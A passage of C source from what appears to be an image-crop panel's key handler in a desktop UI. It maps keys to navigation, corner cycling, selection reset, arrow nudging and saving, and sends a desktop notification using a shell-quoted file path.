        if (s->crop.from_pick) { crop_pick_open(s, 1); return 1; }
        crop_hide(s);
        return 1;

    case XKB_KEY_BackSpace:
        if (s->crop.from_view) { crop_back_to_view(s); return 1; }
        if (s->crop.from_pick) { crop_pick_open(s, 1); return 1; }
        return 1;

    case XKB_KEY_q:
        crop_hide(s);
        return 1;

    /* Cycle which corner the arrows drive, clockwise; Shift+Tab the other way.
     * Shift+Tab arrives as ISO_Left_Tab, not as Tab with a modifier — xkb has
     * already applied the shift level, and matching on Tab alone here would
     * make the back direction silently dead. */
    case XKB_KEY_Tab:
        crop_cycle_active(s, +1);
        synui_render_crop(s);
        return 1;

    case XKB_KEY_ISO_Left_Tab:
        crop_cycle_active(s, -1);
        synui_render_crop(s);
        return 1;

    case XKB_KEY_Return:
    case XKB_KEY_KP_Enter: {
        if (!crop_has_selection(s)) {
            snprintf(s->crop.status, sizeof(s->crop.status),
                     "Selection is too small");
            synui_render_crop(s);
            return 1;
        }
        char written[600];
        if (crop_write(s, written, sizeof(written)) == 0) {
            /* QUOTED, not interpolated — the output name is derived from the
             * input path, which is untrusted. See crop_shell_quote(). */
            char q[sizeof(written) * 4 + 8];
            crop_shell_quote(written, q, sizeof(q));

            /* Report by toast, not just in the log — this is reached from a
             * file manager and the panel disappears on success, so without it
             * there is nothing to say a file was written or where. */
            char cmd[sizeof(q) * 2 + 64];
            snprintf(cmd, sizeof(cmd),
                     "notify-send -a synui -i %s 'Cropped' %s", q, q);
            synui_spawn(cmd);
            crop_hide(s);
        } else {
            snprintf(s->crop.status, sizeof(s->crop.status),
                     "Could not write the file");
            synui_render_crop(s);
        }
        return 1;
    }

    /* Out to the viewer: the picture with nothing drawn over it, and the way
     * back to the folder walk. The same key that reaches the viewer from a row
     * in the list. */
    case XKB_KEY_v:
        crop_back_to_view(s);
        return 1;

    /* Select everything again — the way back from a bad drag. */
    case XKB_KEY_a:
        s->crop.ax = 0; s->crop.ay = 0;
        s->crop.bx = s->crop.img_w; s->crop.by = s->crop.img_h;
        s->crop.status[0] = '\0';
        crop_active_sync(s);
        synui_render_crop(s);
        return 1;

#define CROP_ARROW(dx, dy)                                  \
        do {                                                \
            if (pan) crop_pan(s, (dx), (dy), step);         \
            else     crop_nudge(s, (dx), (dy), step);       \
            synui_render_crop(s);                           \
            return 1;                                       \
        } while (0)

    case XKB_KEY_Left:  CROP_ARROW(-1,  0);
    case XKB_KEY_Right: CROP_ARROW( 1,  0);
    case XKB_KEY_Up:    CROP_ARROW( 0, -1);
    case XKB_KEY_Down:  CROP_ARROW( 0,  1);

#undef CROP_ARROW

    default:
        return 1;   /* modal, as every other panel is */
    }
}
